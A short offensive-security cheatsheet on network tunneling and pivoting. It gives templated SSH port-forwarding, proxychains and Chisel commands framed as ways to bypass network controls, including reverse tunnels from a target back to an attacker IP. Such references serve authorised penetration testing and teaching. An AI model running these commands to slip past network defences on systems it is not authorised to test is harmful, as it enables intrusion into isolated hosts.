---
id: 92fb0e54-a9c3-43b4-aca4-60d4750d1238
name: Tunneling
type: cheatsheet
verified: true
created_at: '2019-10-02T01:10:12.397804+00:00'
updated_at: '2023-05-30T20:07:15.177334+00:00'
---

# Tunneling

**Status**: ✓ Verified

# Description

Using network traffic encapsulation to bypass network controls and access isolated hosts.



## SSH





**Command** ([[SSH Local Port Forwarding to a Remote Server]]):

```bash
ssh -f -N -L $_ATTACKER_PORT:$_REMOTE_IP:$_REMOTE_PORT $_USER@$_TARGET_IP
```



This command forwards a local port through an SSH tunnel to the target SSH server.







**Command** ([[SSH Remote Port Forwarding to an Attacker]]):

```bash
ssh -f -N -R $_REMOTE_PORT:$_REMOTE_IP:$_LOCAL_PORT $_USER@$_TARGET_IP
```



This command forwards a remote port through an SSH tunnel to a local machine.







**Command** ([[SSH Dynamic Port Forwarding Through a Remote Host]]):

```bash
ssh -f -N -D $_PORT $_USERNAME@$_TARGET_IP
```



This command forwards local traffic through an SSH tunnel, allowing a local machine to connect dynamically through the remote SSH server via a SOCKS proxy.





## Proxychains





**Command** ([[Proxychains Redirect an Application's Network Traffic Through a SOCKS Proxy]]):

```bash
proxychains $_PROGRAM
```



Note: By default, Proxychains attempts to connect to a proxy on port 9050. This can be changed by editing `/etc/proxychains.conf`





## Chisel





**Command** ([[Chisel Deploy a Reverse Port Forwarding Server]]):

```bash
chisel server -p $_LISTEN_PORT --reverse
```









**Command** ([[Chisel Deploy a Reverse Port Forwarding Client (Target)]]):

```bash
chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_DESTINATION_PORT:$_SOURCE_PORT
```







**Command** ([[Chisel Deploy a SOCKS5 Proxy Server (Target)]]):

```bash
chisel server -p $_LISTEN_PORT --socks5
```







**Command** ([[Chisel Deploy a SOCKS5 Client (Attacker)]]):

```bash
chisel client $_TARGET_IP:$_TARGET_PORT socks
```








